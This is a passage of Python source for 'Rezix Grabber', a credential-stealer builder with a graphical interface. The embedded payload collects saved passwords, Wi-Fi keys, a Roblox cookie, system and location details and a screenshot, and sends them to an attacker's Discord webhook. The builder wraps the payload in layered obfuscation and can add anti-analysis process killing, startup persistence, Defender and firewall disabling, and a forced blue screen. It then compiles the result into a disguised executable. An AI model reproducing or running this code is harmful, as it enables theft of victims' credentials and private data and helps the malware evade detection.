        stats1 = requests.get(ipv4)
        json_stats1 = stats1.json()
        if debug == 1:print("/14> Getting Location & IP")
        print("/15> IP & Location Grabbed")
        ip = json_stats1["ip"]
        city = json_stats1["city"]
        region = json_stats1["region"]
        countrycode = json_stats1["country"]
        postal = json_stats1["postal"]
        timezone = json_stats1["timezone"]
        org = json_stats1["org"]
        loc = json_stats1['loc']
        googlemap = "https://www.google.com/maps/search/google+map++" + json_stats1['loc']
    def final_stage():
        Arch1 = platform.machine()
        Arch = Arch1.replace("AMD", "")
        if debug == 1:print("/16> Creating Webhook, Embed And Uploading Files")
        def get_size(bytes, suffix="B"):
            factor = 1024
            for unit in ["", "K", "M", "G", "T", "P"]:
                if bytes < factor:
                    return f"{bytes:.2f}{unit}{suffix}"
                bytes /= factor
        def display_name() -> str:
                GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
                NameDisplay = 3
                size = ctypes.pointer(ctypes.c_ulong(0))
                GetUserNameEx(NameDisplay, None, size)
                nameBuffer = ctypes.create_unicode_buffer(size.contents.value)
                GetUserNameEx(NameDisplay, nameBuffer, size)
                return nameBuffer.value
        def proxy_check(ip):
                url = f"https://vpnapi.io/api/{ip}"
                response = requests.get(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"})
                data = response.json()
                security = data["security"]
                [proxy, vpn, tor] = [security["proxy"], security["vpn"], security["tor"]]
                if proxy or vpn or tor:
                    return True
                return False
        def get_network(ip):
            global network
            url = f"https://vpnapi.io/api/{ip}"
            response = requests.get(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"})
            data = response.json()
            network1 = data["network"]
            network = network1["network"]
            return network
        proxy = proxy_check(ip)
        getnetwrok = get_network(ip)
        MainMSG.add_embed_field(name="\n:bust_in_silhouette: User Info", value=f"```Username: {User}\nPC Name: {Host}\nWho Am I?: {WhoAmI.strip()}\nDisplay Name: {display_name()}```", inline=False)
        MainMSG.add_embed_field(name="\n:desktop: OS Info", value=f"```OS Edition: {osName.strip()}\nArch: {Arch}\nOS Version: {OS}\nVM State: {VMstate}```", inline=False)
        MainMSG.add_embed_field(name="\n:computer: System Info", value=f"```\nBoot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}\nCPU: {cpu.name}\nGPU: {gpu.name}\nRAM: {round(psutil.virtual_memory().total/1000000000, 2)} GB\nHWID: {hwid}\n```", inline=False) 
        MainMSG.add_embed_field(name=":floppy_disk: Disks", value=f"```{disk}```", inline=True)
        MainMSG.add_embed_field(name=":envelope: Mails Found", value=f"```{mails}```", inline=False) 
        MainMSG.add_embed_field(name=":red_square: Roblox Cookie", value=f"```{RBcookie}```", inline=False) 
        NetMSG.add_embed_field(name=":round_pushpin: IP Info", value=f"Google Maps: [Open in browser]({googlemap})```IP: {ip}\nMAC: {mac}\nNetwork: {getnetwrok}\nCity: {city}\nRegion: {region}\nCountry: {countrycode}\nTimezone: {timezone}\nPostal: {postal}\nORG: {org}\nLocation: {loc}\nProxy: {proxy}\n```[More Info](https://ipapi.co/{ip}/json/)", inline=True)
        NetMSG.add_embed_field(name=":satellite: Network Ping / Misc", value=f"```Cloudflare: {Ping1111}\nGoogle: {Ping8888}\n\n\nBytes Sent: {get_size(net_io.bytes_sent)}\nBytes Received: {get_size(net_io.bytes_recv)}\n```", inline=True)
        NetMSG.add_embed_field(name=":unlock: Wifi Passwords", value=f"```{out}```", inline=False)
        CopyMSG.add_embed_field(name="About Project Rezix", value="`Created by:` [DeadSkajp#5906](https://discordapp.com/users/527506330630619146)\n`Discord Server:` https://discord.gg/gUVF7nNuQ8\n`Website:` https://rezix.tk/", inline=False)
        with open(f"{tmpPath}/screen.jpg", "rb") as f:
            upFiles.add_file(file=f.read(), filename='screen.jpg')
        with open(f"{tmpPath}/misc.txt", "rb") as f:
            upFiles.add_file(file=f.read(), filename='misc.txt')
        with open(f"{tmpPath}/Pass.txt", "rb") as f:
            upFiles.add_file(file=f.read(), filename='Passwords.txt')
        if debug == 1:print("/17> Sending Embed And Files")
        MessageWH.add_embed(MainMSG)
        MessageWH.add_embed(NetMSG)
        MessageWH.add_embed(CopyMSG)
        subprocess.call(f'del /F /S /Q {tmpPath}\whoami.txt {tmpPath}\os.txt {tmpPath}\cf1.txt {tmpPath}\8888.txt {tmpPath}\screen.jpg {tmpPath}\misc.txt {tmpPath}\osname1.txt {tmpPath}\Pass.txt {tmpPath}\mails.txt {tmpPath}\ChromeData.db >nul', shell=True) 
        if debug == 1:print("/18> Temp Files Deleted")
        response = MessageWH.execute() 
        response = upFiles.execute() 
        if debug == 1:print("/19> Everything Sended")
        if debug == 1:print("/20> Thanks For Using Rezix Grabber | by DeadSkajp#5906")
    check_Blacklist()
    Prepare_stage()
    Del_Previous()
    Grab_Mail()
    MailDupe(usernames)
    Grab_Passwords()
    RBLXsteal()
    PC_specs()
    CreateTxTs()
    TxTtoVar()
    Screenshot()
    GetIPloc()
    final_stage()
RezixGrabber()
# Grabber Coded by DeadSkajp#5906
# Discord server: https://discord.gg/gUVF7nNuQ8
# Website: https://rezix.tk/
'''

class Obfuscator:
    def __init__(self, code):
        self.code = code
        self.__obfuscate()
    def __xorED(self, text, key = None):
        newstring = ""
        if key is None:
            key = "".join(random.choices(string.digits + string.ascii_letters, k= random.randint(4, 8)))
        if not key[0] == " ":
            key = " " + key
        for i in range(len(text)):
            newstring += chr(ord(text[i]) ^ ord(key[(len(key) - 2) + 1]))
        return (newstring, key)
    def __encodestring(self, string):
        newstring = ''
        for i in string:
            if random.choice([True, False]):
                newstring += '\\x' + codecs.encode(i.encode(), 'hex').decode()
            else:
                newstring += '\\' + oct(ord(i))[2:]
        return newstring
    def __obfuscate(self):
        xorcod = self.__xorED(self.code)
        self.code = xorcod[0]
        encoded_code = base64.b64encode(codecs.encode(codecs.encode(self.code.encode(), 'bz2'), 'uu')).decode()
        encoded_code = [encoded_code[i:i + int(len(encoded_code) / 4)] for i in range(0, len(encoded_code), int(len(encoded_code) / 4))]
        new_encoded_code = []
        new_encoded_code.append(codecs.encode(encoded_code[0].encode(), 'uu').decode() + 'u')
        new_encoded_code.append(codecs.encode(encoded_code[1], 'rot13') + 'r')
        new_encoded_code.append(codecs.encode(encoded_code[2].encode(), 'hex').decode() + 'h')
        new_encoded_code.append(base64.b85encode(codecs.encode(encoded_code[3].encode(), 'hex')).decode() + 'x')
        self.code = f"""
_____=eval("{self.__encodestring('eval')}");_______=_____("{self.__encodestring('compile')}");______,____=_____(_______("{self.__encodestring("__import__('base64')")}","",_____.__name__)),_____(_______("{self.__encodestring("__import__('codecs')")}","",_____.__name__));____________________=_____("'{self.__encodestring(xorcod[True])}'");________,_________,__________,___________=_____(_______("{self.__encodestring('exec')}","",_____.__name__)),_____(_______("{self.__encodestring('str.encode')}","",_____.__name__)),_____(_______("{self.__encodestring('isinstance')}","",_____.__name__)),_____(_______("{self.__encodestring('bytes')}","",_____.__name__))
def ___________________(__________, ___________):
    __________=__________.decode()
    _________=""
    if not ___________[False]=="{self.__encodestring(' ')}":
        ___________="{self.__encodestring(' ')}"+___________
    for _ in range(_____("{self.__encodestring('len(__________)')}")):
        _________+=_____("{self.__encodestring('chr(ord(__________[_])^ord(___________[(len(___________) - True*2) + True]))')}")
    return (_________,___________)
def ____________(_____________):
    if(_____________[-True]!=_____(_______("'{self.__encodestring('c________________6s5________________6ardv8')}'[-True*4]","",_____.__name__))):_____________ = _________(_____________)
    if not(__________(_____________, ___________)):_____________ = _____(_______("{self.__encodestring('____.decode(_____________[:-True]')},'{self.__encodestring('rot13')}')","",_____.__name__))
    else:
        if(_____________[-True]==_____(_______("b'{self.__encodestring('f5sfsdfauf85')}'[-True*4]","", _____.__name__))):
            _____________=_____(_______("{self.__encodestring('____.decode(_____________[:-True]')},'{self.__encodestring('uu')}')","",_____.__name__))
        elif (_____________[-True] ==_____(_______("b'{self.__encodestring('d5sfs1dffhsd8')}'[-True*4]","", _____.__name__))):_____________=_____(_______("{self.__encodestring('____.decode(_____________[:-True]')},'{self.__encodestring('hex')}')","",_____.__name__))
        else:_____________=_____(_______("{self.__encodestring('______.b85decode(_____________[:-True])')}","",_____.__name__));_____________=_____(_______("{self.__encodestring('____.decode(_____________')}, '{self.__encodestring('hex')}')","",_____.__name__))
        _____________=_____(_______("{self.__encodestring('___________.decode(_____________)')}","",_____.__name__))
    return _____________
_________________=_____(_______("{self.__encodestring('___________.decode')}({self.__encodestring(new_encoded_code[True*3]).encode()})","",_____.__name__));________________ = _____(_______("{self.__encodestring('___________.decode')}({self.__encodestring(new_encoded_code[1]).encode()})","",_____.__name__));__________________=_____(_______("{self.__encodestring('___________.decode')}({self.__encodestring(new_encoded_code[True*2]).encode()})","",_____.__name__));______________=_____(_______("{self.__encodestring('___________.decode')}({self.__encodestring(new_encoded_code[False]).encode()})","",_____.__name__));_______________=_____(_______("{self.__encodestring('str.join')}('', {self.__encodestring('[____________(x) for x in [______________,________________,__________________,_________________]]')})","", _____.__name__));________(___________________(____.decode(____.decode(______.b64decode(_________(_______________)), "{self.__encodestring("uu")}"),"{self.__encodestring("bz2")}"),____________________)[_____("{self.__encodestring('False')}")])\nimport requests, json, os, sys, base64, shutil, sqlite3, platform, psutil, subprocess, wmi, uuid, re, ctypes, random, time, browser_cookie3, threading;from discord_webhook import DiscordWebhook, DiscordEmbed;from PIL import ImageGrab;from datetime import datetime;from sqlite3 import connect;from collections import Counter;from win32crypt import CryptUnprotectData;from Cryptodome.Cipher import AES;from tempfile import gettempdir, mkdtemp"""

class Rezix:
    def __init__(self):
        self.antivmcode = ''
        self.antiprocesscode=''
        self.startupcode = ''
        self.disdefcode = ''
        self.bsodcode = ''
        self.antivm = False
        self.antiprocess = False
        self.obfuscate = False
        self.addstartup = False
        self.noconsole = False
        self.errormsg = False
        self.upxcomp = False
        self.BSOD = False
        self.DisDEF = False
        self.setup()
    def browseico(self):
        self.iconname = askopenfilename(filetypes=(("ico files","*.ico"),("All files","*.*")))
        messagebox.showinfo('Rezix Grabber', f'File Chose : {self.iconname}')
    def antivmlol(self):
        if self.antivm == False:self.antivm=True;self.antivmb.config(image=fullbu);self.antivmcode=r"""
import psutil
blacklistedProcesses = ["httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64",  "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]
for proc in psutil.process_iter():
    if any(procstr in proc.name().lower() for procstr in blacklistedProcesses):
        try:
            proc.kill()
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            sys.exit()
            pass
        """
        else:self.antivm=False;self.antivmb.config(image=blankbu);self.antivmcode=''
    def antiprocesslol(self):
        if self.antiprocess==False:self.antiprocess=True;self.antiprocessb.config(image=fullbu);self.antiprocesscode=r"""
import psutil
AntiProcess = ["httpdebuggerui", "http", "wireshark", "fiddler", "taskmgr", "vboxservice", "df5serv", "processhacker", "ida64", "ollydbg", "pestudio", "vgauthservice", "vmacthlp", "x96dbg", "x32dbg", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver", "traffic", "fiddler", "packet"]
for proc in psutil.process_iter():
    if any(procstr in proc.name().lower() for procstr in AntiProcess):
        try:
            proc.kill()
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            sys.exit()
            pass
        """
        else:self.antiprocess=False;self.antiprocessb.config(image=blankbu);self.antiprocesscode=''
    def obfuscatelol(self):
        if self.obfuscate == False:self.obfuscate=True;self.obfuscateb.config(image=fullbu)
        else:self.obfuscate=False;self.obfuscateb.config(image=blankbu)
    def addstartuplol(self):
        if self.addstartup==False:self.addstartup=True;self.addstartupb.config(image=fullbu);self.startupcode=r"""
import os, sys
from sys import argv
from shutil import copy2
bruh = sys.argv[0].replace("\\", "/").split("/")
bruh.reverse()
startup_path = os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
if os.path.exists(startup_path + bruh[0]):
    os.remove(startup_path + bruh[0])
    copy2(argv[0], startup_path)
else:
    copy2(argv[0], startup_path)
        """
        else:self.addstartup=False;self.addstartupb.config(image=blankbu);self.startupcode=''
    def disdeflol(self):
        if self.DisDEF==False:self.DisDEF=True;self.disdefbu.config(image=fullbu);self.disdefcode=r"""
import subprocess
subprocess.call("powershell Set-MpPreference -DisableRealtimeMonitoring $true && netsh Advfirewall set allprofiles state off", shell=True)
        """
        else:self.DisDEF=False;self.disdefbu.config(image=blankbu);self.disdefcode=''
    def bsodlol(self):
        if self.BSOD==False:self.BSOD=True;self.bsodbu.config(image=fullbu);self.bsodcode=r"""
import ctypes
ntdll = ctypes.windll.ntdll
prev_value = ctypes.c_bool()
res = ctypes.c_ulong()
ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
    print("BSOD Successfull!")
else:
    print("BSOD Failed...")    
        """
        else:self.BSOD=False;self.bsodbu.config(image=blankbu);self.bsodcode=''
    def noconsolelol(self):
        if self.noconsole==False:self.noconsole=True;self.noconsoleb.config(image=fullbu)
        else:self.noconsole=False;self.noconsoleb.config(image=blankbu)
    def upxcomplol(self):
        if self.upxcomp==False:self.upxcomp=True;self.upxcompbu.config(image=fullbu)
        else:self.upxcomp=False;self.upxcompbu.config(image=blankbu)
    def testwebhook(self):
        try:
            webhookz = self.webhook.get()
            a = True
        except:messagebox.showerror('Rezix Grabber', 'Invalid Webhook');a=False
        if a == True:
            try:
                webhook = DiscordWebhook(url=webhookz, username="Rezix", avatar_url=r"https://i.imgur.com/JTXOj5G.jpg")
                embed = DiscordEmbed(title=f"Working", description=f"```Webhook is working!```", color='BCC0C0')
                embed.set_author(name="Project Rezix", icon_url=r'https://i.imgur.com/JTXOj5G.jpg', url="https://rezix.tk/")
                embed.set_footer(text='By DeadSkajp#5906')
                embed.set_timestamp()
                webhook.add_embed(embed)
                response = webhook.execute()
            except:messagebox.showerror('Rezix Grabber', 'Invalid Webhook')
    def errormsglol(self):
        if self.errormsg==False:self.errormsg=True;self.errormsgb.config(image=fullbu)
        else:self.errormsg=False;self.errormsgb.config(image=blankbu)
    def installrequirements(self):
        try:
            os.system('cd assets && requirements.bat && cd ..')
            messagebox.showinfo('Rezix Grabber', 'Successfully Installed Requirements! You can now setup and build your grabber')
        except:messagebox.showerror('Rezix Grabber','Error Occured! Make sure you have Python in PATH')
    def installpython(self):
        try:
            webbrowser.open('https://www.python.org/ftp/python/3.9.9/python-3.9.9-amd64.exe')
            messagebox.showinfo('Rezix Grabber','Make sure to add python to PATH')
        except:messagebox.showerror('Rezix Grabber', 'Error Occured')
    def youtube(self):
        webbrowser.open('https://www.youtube.com/channel/UCyeodxAgQ0j8zaaYiWgNjkA?sub_confirmation=1')
    def discord(self):
        webbrowser.open('https://discord.gg/gUVF7nNuQ8')
    def paypal(self):
        webbrowser.open('https://www.paypal.com/donate/?hosted_button_id=YT6S6HXJK6JWE')
    def checkversion(self):
        try:
            messagebox.showinfo('Rezix Grabber', f'Your version : {sys.version}')
        except:messagebox.showerror('Rezix Grabber', 'You dont have python. Please install it from this website: https://python.org/')
    def compileexe(self):
        subprocess.call('start ./assets/building.vbs', shell=True)
        isicon = True
        name = self.name.get()
        if self.addstartup or self.DisDEF == True:
            PyInsAdmin = '--uac-admin'
        else:
            PyInsAdmin = ''
        if len(name) < 1:
            name = "Default"
        try:
            icon = self.iconname
            if os.path.exists(icon):
                pass
            else:
                isicon=False
        except:isicon=False
        sleep(1)
        if isicon and self.noconsole and self.upxcomp == False:
            os.system(f'Python -m PyInstaller --onefile --name {name} --icon {icon} {PyInsAdmin} --noconsole --clean --log-level=INFO --hidden-import="browser_cookie3" --hidden-import="threading" --hidden-import="ctypes" --hidden-import="uuid" --hidden-import="wmi" --hidden-import="sqlite3" --hidden-import="win32crypt" --hidden-import="Cryptodome" --hidden-import="Cryptodome.Cipher.AES" --hidden-import="pycryptodomex" --hidden-import="platform" --hidden-import="cpuinfo" --hidden-import="requests" --hidden-import="psutil" --hidden-import="discord_webhook"  --hidden-import="PIL.ImageGrab" --hidden-import="PIL" GraB_.py')
        elif isicon and self.noconsole and self.upxcomp:
            os.system(f'Python -m PyInstaller --onefile --name {name} --icon {icon} {PyInsAdmin} --noconsole --clean --log-level=INFO --upx-dir ./assets --hidden-import="browser_cookie3" --hidden-import="threading" --hidden-import="ctypes" --hidden-import="uuid" --hidden-import="wmi" --hidden-import="sqlite3" --hidden-import="win32crypt" --hidden-import="Cryptodome" --hidden-import="Cryptodome.Cipher.AES" --hidden-import="pycryptodomex" --hidden-import="platform" --hidden-import="cpuinfo" --hidden-import="requests" --hidden-import="psutil" --hidden-import="discord_webhook"  --hidden-import="PIL.ImageGrab" --hidden-import="PIL" GraB_.py')
        elif isicon == False and self.noconsole and self.upxcomp == False:
            os.system(f'Python -m PyInstaller --onefile --name {name} {PyInsAdmin} --noconsole --clean --log-level=INFO --hidden-import="browser_cookie3" --hidden-import="threading" --hidden-import="ctypes" --hidden-import="uuid" --hidden-import="wmi" --hidden-import="sqlite3" --hidden-import="win32crypt" --hidden-import="Cryptodome" --hidden-import="Cryptodome.Cipher.AES" --hidden-import="pycryptodomex" --hidden-import="platform" --hidden-import="cpuinfo" --hidden-import="requests" --hidden-import="psutil" --hidden-import="discord_webhook"  --hidden-import="PIL.ImageGrab" --hidden-import="PIL" GraB_.py')
        elif isicon == False and self.noconsole and self.upxcomp:
            os.system(f'Python -m PyInstaller --onefile --name {name} {PyInsAdmin} --noconsole --clean --log-level=INFO --upx-dir ./assets --hidden-import="browser_cookie3" --hidden-import="threading" --hidden-import="ctypes" --hidden-import="uuid" --hidden-import="wmi" --hidden-import="sqlite3" --hidden-import="win32crypt" --hidden-import="Cryptodome" --hidden-import="Cryptodome.Cipher.AES" --hidden-import="pycryptodomex" --hidden-import="platform" --hidden-import="cpuinfo" --hidden-import="requests" --hidden-import="psutil" --hidden-import="discord_webhook"  --hidden-import="PIL.ImageGrab" --hidden-import="PIL" GraB_.py')
        elif isicon and self.noconsole == False and self.upxcomp == False:
            os.system(f'Python -m PyInstaller --onefile --name {name} --icon {icon} {PyInsAdmin} --clean --log-level=INFO --hidden-import="browser_cookie3" --hidden-import="threading" --hidden-import="ctypes" --hidden-import="uuid" --hidden-import="wmi" --hidden-import="sqlite3" --hidden-import="win32crypt" --hidden-import="Cryptodome" --hidden-import="Cryptodome.Cipher.AES" --hidden-import="pycryptodomex" --hidden-import="platform" --hidden-import="cpuinfo" --hidden-import="requests" --hidden-import="psutil" --hidden-import="discord_webhook"  --hidden-import="PIL.ImageGrab" --hidden-import="PIL" GraB_.py')
        elif isicon and self.noconsole == False and self.upxcomp:
            os.system(f'Python -m PyInstaller --onefile --name {name} --icon {icon} {PyInsAdmin} --clean --log-level=INFO --upx-dir ./assets --hidden-import="browser_cookie3" --hidden-import="threading" --hidden-import="ctypes" --hidden-import="uuid" --hidden-import="wmi" --hidden-import="sqlite3" --hidden-import="win32crypt" --hidden-import="Cryptodome" --hidden-import="Cryptodome.Cipher.AES" --hidden-import="pycryptodomex" --hidden-import="platform" --hidden-import="cpuinfo" --hidden-import="requests" --hidden-import="psutil" --hidden-import="discord_webhook"  --hidden-import="PIL.ImageGrab" --hidden-import="PIL" GraB_.py')
        elif isicon == False and self.noconsole == False and self.upxcomp == False:
            os.system(f'Python -m PyInstaller --onefile --name {name} --clean --log-level=INFO --hidden-import="browser_cookie3" --hidden-import="threading" --hidden-import="ctypes" --hidden-import="uuid" --hidden-import="wmi" --hidden-import="sqlite3" --hidden-import="win32crypt" --hidden-import="Cryptodome" --hidden-import="Cryptodome.Cipher.AES" --hidden-import="pycryptodomex" --hidden-import="platform" --hidden-import="cpuinfo" --hidden-import="requests" --hidden-import="psutil" --hidden-import="discord_webhook"  --hidden-import="PIL.ImageGrab" --hidden-import="PIL" GraB_.py')
        elif isicon == False and self.noconsole == False and self.upxcomp:
            os.system(f'Python -m PyInstaller --onefile --name {name} {PyInsAdmin} --clean --log-level=INFO --upx-dir ./assets --hidden-import="browser_cookie3" --hidden-import="threading" --hidden-import="ctypes" --hidden-import="sqlite3" --hidden-import="win32crypt" --hidden-import="Cryptodome" --hidden-import="Cryptodome.Cipher.AES" --hidden-import="pycryptodomex" --hidden-import="platform" --hidden-import="cpuinfo" --hidden-import="requests" --hidden-import="psutil" --hidden-import="discord_webhook"  --hidden-import="PIL.ImageGrab" --hidden-import="PIL" GraB_.py')
        try:
            shutil.move(f"{os.getcwd()}\\dist\\{name}.exe", f"{os.getcwd()}\\exes\\{name}.exe")
            bgg2= Label(window, image=fc, borderwidth=0,bg='#242424')
            bgg2.place(x=568,y=390)
            subprocess.call('start ./assets/done.vbs', shell=True)
            subprocess.call(f'del /F /S /Q GraB_.py {name}.spec >nul', shell=True)
            shutil.rmtree('build')
            shutil.rmtree('dist')
            shutil.rmtree('__pycache__')
            self.compile()
        except:
            try:
                shutil.rmtree('build')
                shutil.rmtree('dist')
                shutil.rmtree('__pycache__')
                subprocess.call(f'del /F /S /Q GraB_.py {name}.spec >nul', shell=True)
                messagebox.showerror('Rezix Grabber', 'Something went wrong!');self.compile()
            except:pass

    def obfuscatethis(self):
        b64 = lambda _monkay : base64.b64encode(_monkay)
        mar = lambda _monkay : marshal.dumps(compile(_monkay,'Rezix_Grabber','exec'))
        zlb = lambda _monkay : zlib.compress(_monkay)
        file = open('GraB.py','r')
        a = file.read()
        for x in range(3):
            method = repr(b64(zlb(mar(a.encode('utf8'))))[::-1])
            data = "exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))" % method
        z = []
        for i in data:
            z.append(ord(i))
        beforemarsh ="_ = %s\nexec(''.join(chr(__) for __ in _))" % z
        marsrc = compile(beforemarsh, 'Get_Rekt_By_Skajp', 'exec')
        obfmarsh = marshal.dumps(marsrc)
        t = zlib.compress(obfmarsh)
        code = f"import marshal,zlib;exec(marshal.loads(zlib.decompress({t})))"
        file.close()
        with open('GraB.py', 'w+') as f:
            f.write(code)
        return True
    def makefile(self):
        webhook = self.webhook.get()
        if self.DisDEF == True:
            endef = """subprocess.call("powershell Set-MpPreference -DisableRealtimeMonitoring $false && netsh Advfirewall set allprofiles state on", shell=True)"""
        if self.DisDEF == False:
            endef = ''
        filecont = fr"""
{self.antivmcode}
{self.antiprocesscode}
{self.disdefcode}
{self.startupcode}
{self.errormsgcode}
webhookw = "{webhook}"
{Rezix_Grabber}
{endef}
{self.bsodcode}
            """
        marsrc = compile(filecont, 'By_Skajp', 'exec')
        encode1 = marshal.dumps(marsrc)
        code1 = f"import marshal;exec(marshal.loads({encode1}))"
        with open('GraB.py', 'w', encoding='utf-8') as f:
            f.write(code1)
        self.obs2()

    def obs2(self):
        with open('GraB.py', encoding='utf-8') as file:
            CODE = file.read()
        obfuscator = Obfuscator(CODE)
        with open('GraB_.py', 'w', encoding='utf-8') as output_file:
            output_file.write(obfuscator.code)
        print(f'/> Code obfuscated!')
        if self.obfuscate == True:
            if self.obfuscatethis() == True:
                subprocess.call("del /F /S /Q GraB.py >nul", shell=True)
                self.compileexe()
        else:
            subprocess.call("del /F /S /Q GraB.py >nul", shell=True)
            self.compileexe()
        
    def verifyshit(self):
        meow = False
        while True:
            #check webhook
            webhook = self.webhook.get()
            if "discord.com" in webhook or "discordapp.com" in webhook:
                x = requests.get(webhook)
                if x.status_code ==200:
                    pass
                else:messagebox.showerror('Rezix Grabber','Invalid Webhook');break
            else:messagebox.showerror('Rezix Grabber','Invalid Webhook');break
            # verify name
            name = self.name.get()
            try:
                new_name = name.replace(" ","_")
            except:pass
            if self.errormsg == True:
                emsg = self.errormsge.get()
                if len(emsg) > 1:
                    self.errormsgcode = fr"""
try:
    import os, subprocess
    with open('C:\Windows\Temp\GetRektByRezix.vbs','w') as e:
        e.write('''
x=MsgBox("{emsg}", vbOkOnly+vbCritical, "Rekt By Project Rezix")
        ''')
        e.close()
    subprocess.call('start C:\Windows\Temp\GetRektByRezix.vbs', shell=True)
except:pass
                    """
                else:messagebox.showerror('Rezix Grabber', 'Invalid Message For Custom Message');self.errormsgcode="";break
            else:self.errormsgcode =""
            meow = True;break
        if meow == False:
            self.compile()
        else:
            self.makefile()

    def setup(self):
        bgg1 = Label(window, image=bg1, borderwidth=0)
        bgg1.place(x=0, y=0)
        bgg = Label(window, image=bg, borderwidth=0)
        bgg.place(x=166, y=0)

        self.gotosettings = Button(window, image=settingbu,bg='#474747',borderwidth=0, activebackground="#474747",command=self.settings)
        self.gotosettings.place(x=-3,y=238)
        self.gotoabout = Button(window, image=aboutbu,bg='#474747',borderwidth=0, activebackground="#474747",command=self.about)
        self.gotoabout.place(x=-3,y=298)
        self.gotosetup = Button(window, image=setupbu,bg='#474747',borderwidth=0, activebackground="#474747",command=self.setup)
        self.gotosetup.place(x=-3,y=178)
        self.gotosetup = Button(window, image=setupbu2,bg='#474747',borderwidth=0, activebackground="#474747",command=self.setup)
        self.gotosetup.place(x=-3,y=178)

        self.webhook = Entry(window,text='b',font=('SeoulHangang',10),bg='#989898', fg='#474747',width=20,borderwidth=0)
        self.webhook.place(x=222, y=80)
        testwbh = Button(window, image=testbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.testwebhook)
        testwbh.place(x=353,y=77)

        browse = Button(window, image=browsebu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.browseico)
        browse.place(x=348,y=184)
        build = Button(window, image=buildbu,bg='#242424',borderwidth=0, activebackground="#242424", command=self.verifyshit)
        build.place(x=535,y=335)
        self.name = Entry(window,text='a',font=('SeoulHangang',10),bg='#989898', fg='#474747',width=29,borderwidth=0)
        self.name.place(x=222, y=141)
        if self.antivm == False:
            self.antivmb = Button(window, image=blankbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.antivmlol)
            self.antivmb.place(x=694,y=41)
        else:
            self.antivmb = Button(window, image=fullbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.antivmlol)
            self.antivmb.place(x=694,y=41)
        if self.antiprocess == False:
            self.antiprocessb = Button(window, image=blankbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.antiprocesslol)
            self.antiprocessb.place(x=694,y=79)
        else:
            self.antiprocessb = Button(window, image=fullbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.antiprocesslol)
            self.antiprocessb.place(x=694,y=79)
        if self.obfuscate == False:
            self.obfuscateb = Button(window, image=blankbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.obfuscatelol)
            self.obfuscateb.place(x=694,y=118)
        else:
            self.obfuscateb = Button(window, image=fullbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.obfuscatelol)
            self.obfuscateb.place(x=694,y=118)
        if self.addstartup== False:
            self.addstartupb = Button(window, image=blankbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.addstartuplol)
            self.addstartupb.place(x=694,y=156)
        else:
            self.addstartupb = Button(window, image=fullbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.addstartuplol)
            self.addstartupb.place(x=694,y=156)
        if self.upxcomp== False:
            self.upxcompbu = Button(window, image=blankbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.upxcomplol)
            self.upxcompbu.place(x=694,y=192)
        else:
            self.upxcompbu = Button(window, image=fullbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.upxcomplol)
            self.upxcompbu.place(x=694,y=192)
        if self.BSOD== False:
            self.bsodbu = Button(window, image=blankbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.bsodlol)
            self.bsodbu.place(x=694,y=230)
        else:
            self.bsodbu = Button(window, image=fullbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.bsodlol)
            self.bsodbu.place(x=694,y=230)
        if self.DisDEF== False:
            self.disdefbu = Button(window, image=blankbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.disdeflol)
            self.disdefbu.place(x=694,y=268)
        else:
            self.disdefbu = Button(window, image=fullbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.disdeflol)
            self.disdefbu.place(x=694,y=268)

        if self.noconsole== False:
            self.noconsoleb = Button(window, image=blankbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.noconsolelol)
            self.noconsoleb.place(x=390,y=280)
        else:
            self.noconsoleb = Button(window, image=fullbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.noconsolelol)
            self.noconsoleb.place(x=390,y=280)
        if self.errormsg== False:
            self.errormsgb = Button(window, image=blankbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.errormsglol)
            self.errormsgb.place(x=390,y=327)
        else:
            self.errormsgb = Button(window, image=fullbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.errormsglol)
            self.errormsgb.place(x=390,y=327)
        self.errormsge = Entry(window,text='d',font=('SeoulHangang',10),bg='#989898', fg='#474747',width=16,borderwidth=0)
        self.errormsge.place(x=306,y=375)
    def settings(self):
        bgg = Label(window, image=bg3, borderwidth=0)
        bgg.place(x=166, y=0)
        self.gotosetup = Button(window, image=setupbu,bg='#474747',borderwidth=0, activebackground="#474747",command=self.setup)
        self.gotosetup.place(x=-3,y=178)
